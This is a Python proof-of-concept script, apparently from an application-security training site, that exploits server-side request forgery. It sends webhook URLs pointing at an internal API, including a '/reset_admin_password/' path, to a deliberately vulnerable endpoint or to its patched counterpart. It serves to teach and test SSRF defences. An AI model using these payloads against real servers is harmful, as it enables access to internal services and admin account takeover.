from urllib.error import URLError
from urllib.parse import urlencode
from urllib.request import Request, urlopen

import cli

use_vulnerable_endpoint, use_webapp_url = cli.get_cli_arguments()

if use_webapp_url:
    url_prefix = "https://appseccheat.codes"
else:
    url_prefix = "http://127.0.0.1:12300"

if use_vulnerable_endpoint:
    url = f"{url_prefix}/vulnerabilities/ssrf1/submit_webhook/"
else:
    url = f"{url_prefix}/patches/ssrf1/submit_webhook/"

for custom_url in [
    "http://internal_api",
    "http://internal_api:12301",
    "http://internal_api:12301/reset_admin_password/",
]:
    data = {"custom_url": custom_url}

    try:
        req = Request(
            url,
            data=urlencode(data).encode("utf-8"),
            method="POST",
            headers={"Content-Type": "application/x-www-form-urlencoded"},
        )

        with urlopen(req) as response:
            print(f"Response for {custom_url}: {response.read().decode('utf-8')}\n\n\n")
    except URLError as e:
        print(f"Error with {custom_url}: {e}\n\n\n")
